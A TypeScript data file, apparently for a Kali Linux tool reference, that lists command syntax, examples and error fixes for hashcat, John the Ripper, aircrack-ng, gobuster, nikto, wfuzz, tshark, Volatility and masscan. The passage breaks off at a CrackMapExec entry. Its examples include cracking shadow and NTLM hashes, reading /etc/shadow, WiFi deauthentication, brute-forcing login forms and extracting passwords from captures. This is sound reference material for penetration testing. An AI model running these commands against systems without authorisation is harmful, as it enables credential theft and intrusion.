// kali-extended.ts — Deep coverage for high-value offensive/defensive tools
// not fully covered in earlier data files.
import type { KaliTool, Command, KnownError } from "./types";

const cmd = (
  name: string,
  syntax: string,
  description: string,
  examples: { code: string; note: string }[],
  bestScenario: string,
  category: string,
): Command => ({ name, syntax, description, examples, bestScenario, category });

const err = (message: string, cause: string, fix: string): KnownError => ({ message, cause, fix });

export const KALI_EXTENDED_TOOLS: KaliTool[] = [
  /* ------------------------------------------------------------------ */
  /*  hashcat                                                             */
  /* ------------------------------------------------------------------ */
  {
    slug: "hashcat",
    name: "Hashcat",
    category: "Password Attacks",
    package: "hashcat",
    homepage: "https://hashcat.net/hashcat/",
    depth: "deep",
    invocation: "hashcat",
    summary:
      "World's fastest GPU-accelerated password recovery utility. Supports 350+ hash types, six attack modes (dictionary, combinator, mask, rule-based, hybrid, association), and runs on CPU, GPU, and FPGA.",
    commands: [
      cmd(
        "hashcat straight (dictionary)",
        "hashcat -m HASH_TYPE -a 0 hashes.txt wordlist.txt",
        "Dictionary attack: try every word in wordlist against each hash.",
        [
          {
            code: "hashcat -m 1000 -a 0 ntlm.txt /usr/share/wordlists/rockyou.txt",
            note: "Crack NTLM hashes with rockyou.",
          },
          {
            code: "hashcat -m 0 -a 0 md5.txt wordlist.txt -r rules/best64.rule",
            note: "Apply best64 rule set for mutations.",
          },
        ],
        "First crack attempt on NTLM, MD5, SHA-1, bcrypt captures.",
        "Attack",
      ),
      cmd(
        "hashcat mask attack",
        "hashcat -m HASH_TYPE -a 3 hashes.txt ?u?l?l?l?d?d?d?d",
        "Brute-force only the exact character-set/length space defined by a mask.",
        [
          {
            code: "hashcat -m 1000 -a 3 ntlm.txt ?u?l?l?l?l?d?d?s",
            note: "8-char: 1 upper + 4 lower + 2 digit + 1 symbol.",
          },
          { code: "hashcat -m 0 -a 3 md5.txt ?d?d?d?d?d?d", note: "6-digit PIN space." },
        ],
        "When you know the password policy (e.g. 8 chars, 1 upper, 2 digits).",
        "Attack",
      ),
      cmd(
        "hashcat rule-based",
        "hashcat -m HASH_TYPE -a 0 hashes.txt wordlist.txt -r rules/best64.rule",
        "Apply transformation rules (uppercase, append digits, l33t-speak) to each candidate.",
        [
          {
            code: "hashcat -m 1000 -a 0 ntlm.txt rockyou.txt -r rules/OneRuleToRuleThemAll.rule",
            note: "Very broad rule set.",
          },
        ],
        "Recover password that is a dictionary word with predictable mutations.",
        "Attack",
      ),
      cmd(
        "hashcat combinator",
        "hashcat -m HASH_TYPE -a 1 hashes.txt wordlist1.txt wordlist2.txt",
        "Concatenate every word from list1 with every word from list2.",
        [
          {
            code: "hashcat -m 0 -a 1 md5.txt names.txt numbers.txt",
            note: "Firstname+year style passwords.",
          },
        ],
        "Passwords following a pattern like 'word1word2'.",
        "Attack",
      ),
      cmd(
        "hashcat show cracked",
        "hashcat -m HASH_TYPE hashes.txt --show",
        "Display previously cracked hashes from the potfile.",
        [{ code: "hashcat -m 1000 ntlm.txt --show", note: "List hash:plaintext pairs." }],
        "After a crack session to extract results.",
        "Output",
      ),
      cmd(
        "hashcat benchmark",
        "hashcat -b -m HASH_TYPE",
        "Benchmark GPU/CPU speed for a specific hash type.",
        [{ code: "hashcat -b -m 22000", note: "WPA2 speed on current hardware." }],
        "Estimate time-to-crack before launching.",
        "Benchmark",
      ),
      cmd(
        "hashcat status / restore",
        "hashcat ... -s SESSION_RESTORE",
        "Resume an interrupted session.",
        [
          { code: "hashcat --session=crack1 ...", note: "Name the session." },
          { code: "hashcat --restore --session=crack1", note: "Resume it." },
        ],
        "Long-running crack jobs that may be interrupted.",
        "Session",
      ),
    ],
    errors: [
      err(
        "No devices found/left",
        "No OpenCL/CUDA platform detected. GPU driver or OpenCL runtime missing.",
        "Install the correct GPU driver and opencl-headers. On Kali: sudo apt install ocl-icd-opencl-dev.",
      ),
      err(
        "Token length exception",
        "Hash file contains an empty line or wrong hash format.",
        "Clean the hash file: remove blank lines and verify hash type with hashid or hash-identifier.",
      ),
      err(
        "All hashes found in potfile",
        "Hashes were already cracked in a previous session.",
        "Use --show to display results or --potfile-disable to force re-crack.",
      ),
    ],
  },

  /* ------------------------------------------------------------------ */
  /*  John the Ripper                                                     */
  /* ------------------------------------------------------------------ */
  {
    slug: "john",
    name: "John the Ripper",
    category: "Password Attacks",
    package: "john",
    homepage: "https://www.openwall.com/john/",
    depth: "deep",
    invocation: "john",
    summary:
      "Classic multi-platform password cracker with auto-detection of hash types, an incremental mode, a wordlist mode with mangling rules, and the 'Single crack' mode that uses login/GECOS info as candidates.",
    commands: [
      cmd(
        "john wordlist",
        "john --wordlist=WORDLIST hashes.txt",
        "Dictionary attack against a hash file.",
        [
          {
            code: "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt",
            note: "Standard first attempt.",
          },
        ],
        "Quick first-pass on common hashes.",
        "Attack",
      ),
      cmd(
        "john single",
        "john --single hashes.txt",
        "Single crack mode: generate candidates from username, GECOS fields, and account info.",
        [{ code: "john --single shadow.txt", note: "Often cracks user-chosen passwords quickly." }],
        "Cracking /etc/shadow when account info is available.",
        "Attack",
      ),
      cmd(
        "john incremental",
        "john --incremental hashes.txt",
        "Brute-force all possible combinations using a built-in charset.",
        [{ code: "john --incremental=Digits hashes.txt", note: "Digits-only charset." }],
        "When dictionary and rule attacks fail; very slow on long passwords.",
        "Attack",
      ),
      cmd(
        "john show",
        "john --show hashes.txt",
        "Display all cracked passwords from the pot file.",
        [{ code: "john --show shadow.txt", note: "user:password pairs." }],
        "Retrieve results after cracking completes.",
        "Output",
      ),
      cmd(
        "john formats",
        "john --list=formats",
        "List all supported hash formats.",
        [{ code: "john --list=formats | grep -i ntlm", note: "Search for a specific format." }],
        "Identify the correct format flag before cracking.",
        "Reference",
      ),
      cmd(
        "unshadow",
        "unshadow /etc/passwd /etc/shadow > combined.txt",
        "Combine passwd and shadow files for John.",
        [{ code: "sudo unshadow /etc/passwd /etc/shadow | john --stdin", note: "One-liner." }],
        "Always run before cracking /etc/shadow.",
        "Preparation",
      ),
      cmd(
        "ssh2john / zip2john",
        "ssh2john id_rsa > id_rsa.hash",
        "Convert SSH private keys, ZIP archives, KeePass databases, etc., to John-compatible format.",
        [
          {
            code: "ssh2john id_rsa > id_rsa.hash && john id_rsa.hash --wordlist=rockyou.txt",
            note: "Crack SSH passphrase.",
          },
          { code: "zip2john archive.zip > zip.hash && john zip.hash", note: "Crack ZIP password." },
        ],
        "Recovering passphrases from encrypted files.",
        "Conversion",
      ),
    ],
    errors: [
      err(
        "No password hashes loaded",
        "Hash file is empty, malformed, or format mismatch.",
        "Run john --list=formats and specify the correct --format= flag.",
      ),
      err(
        "Loaded 0 password hashes with no different salts",
        "All hashes are already in the pot file.",
        "Run john --show or delete ~/.john/john.pot to start fresh.",
      ),
    ],
  },

  /* ------------------------------------------------------------------ */
  /*  aircrack-ng suite                                                   */
  /* ------------------------------------------------------------------ */
  {
    slug: "aircrack-ng",
    name: "Aircrack-ng",
    category: "Wireless Attacks",
    package: "aircrack-ng",
    homepage: "https://www.aircrack-ng.org",
    depth: "deep",
    invocation: "aircrack-ng",
    summary:
      "Complete suite for 802.11 wireless network auditing: packet capture (airodump-ng), injection/deauth (aireplay-ng), cracking (aircrack-ng), and adapter management (airmon-ng).",
    commands: [
      cmd(
        "airmon-ng start",
        "sudo airmon-ng start INTERFACE",
        "Enable monitor mode on a wireless adapter.",
        [{ code: "sudo airmon-ng start wlan0", note: "Creates wlan0mon." }],
        "Required first step before any wireless capture.",
        "Setup",
      ),
      cmd(
        "airmon-ng check kill",
        "sudo airmon-ng check kill",
        "Kill processes that interfere with monitor mode (NetworkManager, wpa_supplicant).",
        [{ code: "sudo airmon-ng check kill", note: "Run before enabling monitor mode." }],
        "Preventing interference during capture.",
        "Setup",
      ),
      cmd(
        "airodump-ng survey",
        "sudo airodump-ng INTERFACE",
        "Scan for nearby 802.11 networks and clients.",
        [
          {
            code: "sudo airodump-ng wlan0mon",
            note: "Displays BSSIDs, ESSIDs, channels, encryption.",
          },
        ],
        "Initial survey to identify target network.",
        "Capture",
      ),
      cmd(
        "airodump-ng capture",
        "sudo airodump-ng -c CHANNEL --bssid BSSID -w OUTFILE INTERFACE",
        "Capture packets from a specific AP on a fixed channel.",
        [
          {
            code: "sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon",
            note: "Save to capture-01.cap.",
          },
        ],
        "Capturing WPA2 handshake or WEP IVs.",
        "Capture",
      ),
      cmd(
        "aireplay-ng deauth",
        "sudo aireplay-ng --deauth COUNT -a BSSID INTERFACE",
        "Send deauthentication frames to force a client to reconnect (capturing the handshake).",
        [
          {
            code: "sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon",
            note: "10 deauth frames to all clients.",
          },
        ],
        "Forcing WPA2 handshake capture without waiting.",
        "Injection",
      ),
      cmd(
        "aireplay-ng fake auth",
        "sudo aireplay-ng -1 0 -e ESSID -a BSSID INTERFACE",
        "Fake authentication against a WEP AP to associate the adapter.",
        [
          {
            code: "sudo aireplay-ng -1 0 -e TargetAP -a AA:BB:CC:DD:EE:FF wlan0mon",
            note: "Prerequisite for ARP replay.",
          },
        ],
        "WEP cracking — association required before injection.",
        "Injection",
      ),
      cmd(
        "aircrack-ng WPA2",
        "aircrack-ng -w WORDLIST capture-01.cap",
        "Crack WPA/WPA2 pre-shared key from a captured 4-way handshake.",
        [
          {
            code: "aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap",
            note: "Dictionary attack on handshake.",
          },
        ],
        "Recovering WPA2 PSK from captured handshake.",
        "Crack",
      ),
      cmd(
        "aircrack-ng WEP",
        "aircrack-ng -b BSSID capture-01.cap",
        "Statistical crack of a WEP key from captured IVs.",
        [
          {
            code: "aircrack-ng -b AA:BB:CC:DD:EE:FF capture-01.cap",
            note: "Needs ~10K–80K unique IVs.",
          },
        ],
        "Recovering WEP keys (deprecated, but still seen in legacy networks).",
        "Crack",
      ),
    ],
    errors: [
      err(
        "Monitor mode not enabled",
        "Interface is in managed mode.",
        "sudo airmon-ng start wlan0, then use wlan0mon.",
      ),
      err(
        "No handshake captured in file",
        "Deauth did not force a reconnect, or handshake frames were lost.",
        "Re-run aireplay-ng --deauth targeting a specific client (-c CLIENT_MAC) or wait for a natural reconnect.",
      ),
      err(
        "ioctl(SIOCSIWMODE) failed: Device or resource busy",
        "NetworkManager is holding the adapter.",
        "sudo airmon-ng check kill before starting monitor mode.",
      ),
    ],
  },

  /* ------------------------------------------------------------------ */
  /*  gobuster                                                            */
  /* ------------------------------------------------------------------ */
  {
    slug: "gobuster",
    name: "Gobuster",
    category: "Web Application Analysis",
    package: "gobuster",
    homepage: "https://github.com/OJ/gobuster",
    depth: "deep",
    invocation: "gobuster",
    summary:
      "Fast directory/file brute-forcer and DNS/vhost subdomain enumerator written in Go. Supports dir, dns, vhost, fuzz, and tftp modes.",
    commands: [
      cmd(
        "gobuster dir",
        "gobuster dir -u URL -w WORDLIST",
        "Brute-force directories and files on a web server.",
        [
          {
            code: "gobuster dir -u http://10.0.0.5 -w /usr/share/wordlists/dirb/common.txt",
            note: "Basic directory scan.",
          },
          {
            code: "gobuster dir -u http://10.0.0.5 -w /usr/share/seclists/Discovery/Web-Content/big.txt -x php,html,txt -t 50",
            note: "With file extensions and 50 threads.",
          },
        ],
        "Discovering hidden paths, backup files, and admin panels.",
        "Directory",
      ),
      cmd(
        "gobuster dns",
        "gobuster dns -d DOMAIN -w WORDLIST",
        "Enumerate DNS subdomains via brute-force.",
        [
          {
            code: "gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50",
            note: "Fast subdomain enum.",
          },
        ],
        "Finding subdomains (dev, staging, api, admin).",
        "DNS",
      ),
      cmd(
        "gobuster vhost",
        "gobuster vhost -u URL -w WORDLIST",
        "Discover virtual hosts on a target IP by fuzzing the Host header.",
        [
          {
            code: "gobuster vhost -u http://10.0.0.5 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
            note: "Requires target IP and wordlist.",
          },
        ],
        "Multi-tenant servers where vhosts share an IP.",
        "VHost",
      ),
      cmd(
        "gobuster fuzz",
        "gobuster fuzz -u 'URL?FUZZ=value' -w WORDLIST",
        "Generic fuzzer — replace FUZZ in the URL with wordlist entries.",
        [
          {
            code: "gobuster fuzz -u 'http://10.0.0.5/index.php?page=FUZZ' -w pages.txt",
            note: "LFI/traversal parameter fuzzing.",
          },
        ],
        "Parameter fuzzing, LFI discovery, path traversal.",
        "Fuzz",
      ),
      cmd(
        "gobuster with auth",
        "gobuster dir -u URL -w WORDLIST -U user -P pass",
        "Basic-auth protected site scan.",
        [
          {
            code: "gobuster dir -u http://10.0.0.5/admin/ -w common.txt -U admin -P admin",
            note: "Authenticated directory scan.",
          },
        ],
        "Scanning behind HTTP Basic Auth.",
        "Authentication",
      ),
    ],
    errors: [
      err(
        "Error: error on opening wordlist file: open /path/to/wordlist: no such file or directory",
        "Wordlist path is wrong.",
        "Install seclists: sudo apt install seclists. Default path: /usr/share/seclists/.",
      ),
      err(
        "context deadline exceeded",
        "Too many threads or target is rate-limiting.",
        "Reduce threads with -t 10 and add a delay with --delay 100ms.",
      ),
    ],
  },

  /* ------------------------------------------------------------------ */
  /*  nikto                                                               */
  /* ------------------------------------------------------------------ */
  {
    slug: "nikto",
    name: "Nikto",
    category: "Web Application Analysis",
    package: "nikto",
    homepage: "https://cirt.net/nikto2",
    depth: "deep",
    invocation: "nikto",
    summary:
      "Open-source web server scanner that checks for outdated software, dangerous files, configuration issues, XSS, and over 6,700 potentially dangerous files/programs.",
    commands: [
      cmd(
        "nikto basic scan",
        "nikto -h TARGET",
        "Scan a web server for common vulnerabilities and misconfigurations.",
        [
          { code: "nikto -h http://10.0.0.5", note: "Standard HTTP scan." },
          { code: "nikto -h https://10.0.0.5 -ssl", note: "Force SSL." },
        ],
        "Quick first-look web server assessment.",
        "Scan",
      ),
      cmd(
        "nikto with port",
        "nikto -h TARGET -p PORT",
        "Scan a non-standard port.",
        [{ code: "nikto -h 10.0.0.5 -p 8080", note: "Scan port 8080." }],
        "Targets running on non-default ports.",
        "Scan",
      ),
      cmd(
        "nikto output",
        "nikto -h TARGET -o output.html -Format htm",
        "Save scan results to a file.",
        [
          { code: "nikto -h 10.0.0.5 -o nikto.txt", note: "Text output." },
          { code: "nikto -h 10.0.0.5 -o report.html -Format htm", note: "HTML report." },
        ],
        "Retaining results for reports or further analysis.",
        "Output",
      ),
      cmd(
        "nikto via proxy",
        "nikto -h TARGET -useproxy http://127.0.0.1:8080",
        "Route nikto traffic through Burp Suite for interception.",
        [
          {
            code: "nikto -h http://10.0.0.5 -useproxy http://127.0.0.1:8080",
            note: "All requests through Burp.",
          },
        ],
        "Analysing nikto requests/responses in detail.",
        "Proxy",
      ),
      cmd(
        "nikto auth scan",
        "nikto -h TARGET -id user:pass",
        "Scan with HTTP Basic Auth credentials.",
        [
          {
            code: "nikto -h http://10.0.0.5/admin -id admin:password123",
            note: "Authenticated scan.",
          },
        ],
        "Scanning areas behind HTTP Basic Auth.",
        "Authentication",
      ),
      cmd(
        "nikto with cookies",
        "nikto -h TARGET -cookies 'session=abc123'",
        "Include a session cookie for authenticated scanning.",
        [
          {
            code: "nikto -h http://10.0.0.5 -cookies 'PHPSESSID=abcdef'",
            note: "Session-authenticated scan.",
          },
        ],
        "Web apps using cookie-based auth (forms, JWT).",
        "Authentication",
      ),
    ],
    errors: [
      err(
        "ERROR: No response from host",
        "Target is down, firewalled, or wrong address/port.",
        "Verify with curl or nmap first. Use -timeout to extend wait time.",
      ),
      err(
        "SSL Connect failed",
        "SSL certificate errors or old TLS versions.",
        "Add -ssl flag and try -nossl if target has mixed config. May need to accept self-signed certs.",
      ),
    ],
  },

  /* ------------------------------------------------------------------ */
  /*  wfuzz                                                               */
  /* ------------------------------------------------------------------ */
  {
    slug: "wfuzz",
    name: "Wfuzz",
    category: "Web Application Analysis",
    package: "wfuzz",
    homepage: "https://github.com/xmendez/wfuzz",
    depth: "deep",
    invocation: "wfuzz",
    summary:
      "Web application fuzzer for discovering resources, testing parameters, authentication, and injection points. Uses FUZZ keyword placeholders and supports filter expressions.",
    commands: [
      cmd(
        "wfuzz directory",
        "wfuzz -c -z file,WORDLIST --hc 404 http://TARGET/FUZZ",
        "Fuzz directories and files, hiding 404 responses.",
        [
          {
            code: "wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404 http://10.0.0.5/FUZZ",
            note: "Standard directory fuzz.",
          },
        ],
        "Finding hidden paths on web servers.",
        "Directory",
      ),
      cmd(
        "wfuzz parameter",
        "wfuzz -c -z file,WORDLIST --hc 404 'http://TARGET/page.php?FUZZ=value'",
        "Fuzz GET parameter names.",
        [
          {
            code: "wfuzz -c -z file,params.txt --hc 404 'http://10.0.0.5/search.php?FUZZ=test'",
            note: "Discover hidden parameters.",
          },
        ],
        "Finding undocumented API or form parameters.",
        "Parameter",
      ),
      cmd(
        "wfuzz LFI",
        "wfuzz -c -z file,WORDLIST --hh BASELINE 'http://TARGET/page.php?file=FUZZ'",
        "Fuzz a file inclusion parameter for LFI vulnerabilities.",
        [
          {
            code: "wfuzz -c -z file,lfi.txt --hh 0 'http://10.0.0.5/index.php?page=FUZZ'",
            note: "Hide empty/baseline response length.",
          },
        ],
        "Testing file inclusion / path traversal.",
        "LFI",
      ),
      cmd(
        "wfuzz brute login",
        "wfuzz -c -z file,users.txt -z file,passwords.txt --hc 200 -d 'user=FUZZ&pass=FUZ2Z' URL",
        "Credential stuffing / brute-force login forms.",
        [
          {
            code: "wfuzz -c -z file,users.txt -z file,pass.txt --hs 'Invalid' -d 'user=FUZZ&pass=FUZ2Z' http://10.0.0.5/login",
            note: "Two FUZZ positions.",
          },
        ],
        "Brute-forcing login forms with user:pass combos.",
        "Brute-force",
      ),
      cmd(
        "wfuzz filter expressions",
        "wfuzz -c -z file,WORDLIST --hc 404 --hl LINES URL/FUZZ",
        "Hide responses matching specific line, word, or character counts.",
        [
          {
            code: "wfuzz -c -z file,common.txt --hc 404 --hl 9 http://10.0.0.5/FUZZ",
            note: "Hide 9-line responses (same as 404 page).",
          },
        ],
        "Filtering noise when status codes alone aren't enough.",
        "Filter",
      ),
    ],
    errors: [
      err(
        "Pycurl is not compiled against Openssl",
        "Python/curl SSL library mismatch.",
        "sudo apt install python3-pycurl && pip3 install pycurl --no-cache-dir.",
      ),
      err(
        "FUZZ keyword not found",
        "FUZZ placeholder missing from the URL or data.",
        "Add FUZZ to the URL, -d data, or -H header you want to fuzz.",
      ),
    ],
  },

  /* ------------------------------------------------------------------ */
  /*  wireshark / tshark                                                  */
  /* ------------------------------------------------------------------ */
  {
    slug: "wireshark",
    name: "Wireshark / tshark",
    category: "Sniffing & Spoofing",
    package: "wireshark",
    homepage: "https://www.wireshark.org",
    depth: "deep",
    invocation: "wireshark",
    summary:
      "Industry-standard network protocol analyser. Captures and dissects packets across hundreds of protocols. tshark is the command-line equivalent for scripted/headless use.",
    commands: [
      cmd(
        "tshark capture",
        "sudo tshark -i INTERFACE -w capture.pcap",
        "Capture all packets on an interface to a file.",
        [{ code: "sudo tshark -i eth0 -w capture.pcap", note: "Ctrl+C to stop." }],
        "Recording traffic for offline analysis.",
        "Capture",
      ),
      cmd(
        "tshark filter capture",
        "sudo tshark -i INTERFACE -f 'CAPTURE_FILTER'",
        "Capture only packets matching a BPF filter.",
        [
          { code: "sudo tshark -i eth0 -f 'tcp port 80'", note: "HTTP only." },
          {
            code: "sudo tshark -i eth0 -f 'host 10.0.0.5 and not port 22'",
            note: "Traffic to/from target.",
          },
        ],
        "Reducing capture size on busy networks.",
        "Capture",
      ),
      cmd(
        "tshark display filter",
        "tshark -r capture.pcap -Y 'DISPLAY_FILTER'",
        "Filter a saved pcap for analysis.",
        [
          { code: "tshark -r cap.pcap -Y 'http.request.method == POST'", note: "POST requests." },
          { code: "tshark -r cap.pcap -Y 'ftp.request.command == PASS'", note: "FTP passwords." },
          { code: "tshark -r cap.pcap -Y 'dns && dns.flags.response == 0'", note: "DNS queries." },
        ],
        "Finding credentials or sensitive data in a pcap.",
        "Analysis",
      ),
      cmd(
        "tshark extract fields",
        "tshark -r capture.pcap -T fields -e FIELD",
        "Extract specific protocol fields as text.",
        [
          {
            code: "tshark -r cap.pcap -T fields -e http.host -e http.request.uri -Y 'http.request'",
            note: "URLs from HTTP traffic.",
          },
          {
            code: "tshark -r cap.pcap -T fields -e ip.src -e ip.dst -e tcp.port -Y 'tcp'",
            note: "Connection pairs.",
          },
        ],
        "Building IOC lists or credential extraction scripts.",
        "Analysis",
      ),
      cmd(
        "tshark follow stream",
        "tshark -r capture.pcap -z follow,tcp,ascii,STREAM_ID",
        "Reconstruct a TCP stream as readable text.",
        [{ code: "tshark -r cap.pcap -z follow,tcp,ascii,0", note: "First TCP stream." }],
        "Viewing HTTP conversations or credential exchanges.",
        "Analysis",
      ),
      cmd(
        "wireshark GUI launch",
        "wireshark",
        "Launch the Wireshark GUI for interactive packet analysis.",
        [
          {
            code: "sudo wireshark",
            note: "Root needed for live capture; use setuid/setcap to capture without root.",
          },
        ],
        "Interactive analysis with GUI dissectors and graphs.",
        "GUI",
      ),
    ],
    errors: [
      err(
        "Couldn't run /usr/bin/dumpcap in child_process: Operation not permitted",
        "User not in wireshark group.",
        "sudo usermod -aG wireshark $USER, then log out and back in.",
      ),
      err(
        "no interfaces found",
        "Running without root and not in wireshark group.",
        "Either run with sudo or add user to wireshark group and reload permissions.",
      ),
    ],
  },

  /* ------------------------------------------------------------------ */
  /*  volatility3                                                         */
  /* ------------------------------------------------------------------ */
  {
    slug: "volatility",
    name: "Volatility 3",
    category: "Forensics",
    package: "volatility3",
    homepage: "https://volatilityfoundation.org",
    depth: "deep",
    invocation: "vol",
    summary:
      "The leading open-source memory forensics framework. Analyses RAM dumps to extract processes, network connections, registry hives, file handles, malware artefacts, and more.",
    commands: [
      cmd(
        "vol info",
        "vol -f MEMORY.raw windows.info",
        "Display basic OS information from the memory dump.",
        [
          {
            code: "vol -f memdump.raw windows.info",
            note: "OS version, build, number of processors.",
          },
        ],
        "First step to orient yourself in a new memory dump.",
        "Information",
      ),
      cmd(
        "vol pslist",
        "vol -f MEMORY.raw windows.pslist",
        "List running processes (EPROCESS linked list).",
        [
          {
            code: "vol -f memdump.raw windows.pslist | less",
            note: "PID, PPID, name, create time.",
          },
        ],
        "Finding suspicious or injected processes.",
        "Processes",
      ),
      cmd(
        "vol pstree",
        "vol -f MEMORY.raw windows.pstree",
        "Display process tree showing parent-child relationships.",
        [
          {
            code: "vol -f memdump.raw windows.pstree",
            note: "Spot unusual parent relationships (cmd.exe spawned by Word).",
          },
        ],
        "Detecting malware parent-child anomalies.",
        "Processes",
      ),
      cmd(
        "vol netscan",
        "vol -f MEMORY.raw windows.netscan",
        "Enumerate active and closed network connections.",
        [
          {
            code: "vol -f memdump.raw windows.netscan | grep ESTABLISHED",
            note: "Active connections.",
          },
        ],
        "Finding C2 connections or lateral movement.",
        "Network",
      ),
      cmd(
        "vol cmdline",
        "vol -f MEMORY.raw windows.cmdline",
        "Show command-line arguments of each process.",
        [
          {
            code: "vol -f memdump.raw windows.cmdline | grep -i powershell",
            note: "Find encoded PowerShell commands.",
          },
        ],
        "Recovering attacker commands and payload paths.",
        "Processes",
      ),
      cmd(
        "vol malfind",
        "vol -f MEMORY.raw windows.malfind",
        "Find memory regions with suspicious characteristics (EXECUTE+WRITE, no backing file — common in shellcode injection).",
        [
          {
            code: "vol -f memdump.raw windows.malfind --dump",
            note: "Extract suspicious regions to files for further analysis.",
          },
        ],
        "Detecting process injection, shellcode, and unpacked malware.",
        "Malware",
      ),
      cmd(
        "vol dumpfiles",
        "vol -f MEMORY.raw windows.dumpfiles --physaddr ADDR",
        "Extract files mapped into memory.",
        [
          {
            code: "vol -f memdump.raw windows.dumpfiles --physaddr 0x4a000 -o /tmp/extracted/",
            note: "Dump a specific file handle.",
          },
        ],
        "Recovering dropped payloads or artefacts.",
        "Extraction",
      ),
      cmd(
        "vol hashdump",
        "vol -f MEMORY.raw windows.hashdump",
        "Extract NTLM hashes from SAM/SYSTEM hive in memory.",
        [{ code: "vol -f memdump.raw windows.hashdump", note: "LM:NTLM hash pairs." }],
        "Credential extraction from Windows memory dumps.",
        "Credentials",
      ),
      cmd(
        "vol linux pslist",
        "vol -f MEMORY.raw linux.pslist",
        "List processes from a Linux memory image.",
        [{ code: "vol -f linux.raw linux.pslist", note: "Requires matching kernel symbol file." }],
        "Process analysis on Linux memory dumps.",
        "Linux",
      ),
    ],
    errors: [
      err(
        "Unsatisfied requirement volshell.Volshell.config",
        "Required plugin or layer not found.",
        "Ensure you are using vol3 not vol2 syntax. Run vol --info to list available plugins.",
      ),
      err(
        "No suitable address space mapping found",
        "Memory dump format not recognised.",
        "Specify the format explicitly, e.g., -f memdump.raw windows.info. Some formats need conversion with imagecopy.",
      ),
    ],
  },

  /* ------------------------------------------------------------------ */
  /*  theHarvester                                                        */
  /* ------------------------------------------------------------------ */
  {
    slug: "theharvester",
    name: "theHarvester",
    category: "Information Gathering",
    package: "theharvester",
    homepage: "https://github.com/laramies/theHarvester",
    depth: "deep",
    invocation: "theHarvester",
    summary:
      "OSINT tool for gathering emails, names, subdomains, IPs, URLs, and employee information from public sources (Google, Bing, LinkedIn, Shodan, Hunter.io, SecurityTrails, and 20+ more).",
    commands: [
      cmd(
        "theHarvester basic",
        "theHarvester -d DOMAIN -b SOURCE",
        "Harvest data from a single source.",
        [
          { code: "theHarvester -d target.com -b google", note: "Google dorking." },
          { code: "theHarvester -d target.com -b bing", note: "Bing search." },
        ],
        "Quick targeted OSINT from a specific data source.",
        "Recon",
      ),
      cmd(
        "theHarvester all sources",
        "theHarvester -d DOMAIN -b all",
        "Query all configured data sources.",
        [
          {
            code: "theHarvester -d target.com -b all -l 500 -f results",
            note: "Limit 500 results, save to results.xml.",
          },
        ],
        "Comprehensive OSINT sweep before an engagement.",
        "Recon",
      ),
      cmd(
        "theHarvester with Shodan",
        "theHarvester -d DOMAIN -b shodan",
        "Find IP ranges and open ports via Shodan.",
        [
          {
            code: "theHarvester -d target.com -b shodan",
            note: "Requires SHODAN_KEY in api-keys.yaml.",
          },
        ],
        "Discovering exposed infrastructure during recon.",
        "Recon",
      ),
      cmd(
        "theHarvester save report",
        "theHarvester -d DOMAIN -b google -f OUTFILE",
        "Save results to XML and HTML files.",
        [
          {
            code: "theHarvester -d target.com -b all -f /tmp/harvest",
            note: "Creates harvest.xml and harvest.html.",
          },
        ],
        "Storing recon results for a report.",
        "Output",
      ),
      cmd(
        "theHarvester limit",
        "theHarvester -d DOMAIN -b google -l LIMIT",
        "Set the maximum number of results to retrieve per source.",
        [{ code: "theHarvester -d target.com -b google -l 200", note: "Reduce API usage." }],
        "Throttling large domains or conserving API credits.",
        "Control",
      ),
    ],
    errors: [
      err(
        "MissingSchema: Invalid URL",
        "Domain provided with http:// prefix.",
        "Pass only the domain name, e.g., target.com not https://target.com.",
      ),
      err(
        "shodan.exception.APIError: Invalid API key",
        "Shodan API key not configured.",
        "Edit /usr/share/theharvester/api-keys.yaml and add your SHODAN_KEY.",
      ),
    ],
  },

  /* ------------------------------------------------------------------ */
  /*  masscan                                                             */
  /* ------------------------------------------------------------------ */
  {
    slug: "masscan",
    name: "Masscan",
    category: "Information Gathering",
    package: "masscan",
    homepage: "https://github.com/robertdavidgraham/masscan",
    depth: "deep",
    invocation: "masscan",
    summary:
      "Internet-scale TCP port scanner. Can scan the entire IPv4 address space in under 6 minutes at 10 million packets/second using an asynchronous, stateless transmission approach.",
    commands: [
      cmd(
        "masscan basic",
        "sudo masscan CIDR -p PORTS --rate RATE",
        "Fast TCP port scan of a subnet.",
        [
          {
            code: "sudo masscan 10.0.0.0/24 -p 22,80,443,445 --rate 1000",
            note: "Scan common ports in the subnet.",
          },
          { code: "sudo masscan 10.0.0.0/16 -p 1-65535 --rate 10000", note: "All ports on a /16." },
        ],
        "Large subnet sweeps where nmap would be too slow.",
        "Scan",
      ),
      cmd(
        "masscan output",
        "sudo masscan CIDR -p PORTS -oG output.gnmap",
        "Save results for use with other tools.",
        [
          { code: "sudo masscan 10.0.0.0/24 -p 80 -oG web.txt", note: "Grepable output." },
          {
            code: "sudo masscan 10.0.0.0/24 -p 80 -oX web.xml",
            note: "XML for import into msf/nmap.",
          },
        ],
        "Feeding discovered hosts into nmap for service detection.",
        "Output",
      ),
      cmd(
        "masscan exclude",
        "sudo masscan CIDR -p PORTS --exclude EXCLUSIONS",
        "Exclude specific hosts or ranges.",
        [{ code: "sudo masscan 10.0.0.0/24 -p 22 --exclude 10.0.0.1", note: "Skip the gateway." }],
        "Avoiding scanning out-of-scope hosts.",
        "Control",
      ),
      cmd(
        "masscan resume",
        "sudo masscan --resume paused.conf",
        "Resume an interrupted scan from the pause file.",
        [
          {
            code: "sudo masscan --resume paused.conf",
            note: "masscan creates paused.conf on SIGINT.",
          },
        ],
        "Very long scans that get interrupted.",
        "Session",
      ),
    ],
    errors: [
      err(
        "FAIL: failed to detect a local IP address",
        "Network interface not found or not configured.",
        "Specify the interface: sudo masscan ... --interface eth0.",
      ),
      err(
        "Sending packets too fast, packets dropped",
        "Rate is higher than the NIC/network can handle.",
        "Reduce --rate to something the connection supports (e.g., 100–1000 for home networks).",
      ),
    ],
  },

  /* ------------------------------------------------------------------ */
  /*  crackmapexec                                                        */
  /* ------------------------------------------------------------------ */
  {
    slug: "crackmapexec",
    name: "CrackMapExec",
    category: "Post Exploitation",
    package: "crackmapexec",
    homepage: "https://github.com/Porchetta-Industries/CrackMapExec",
    depth: "deep",
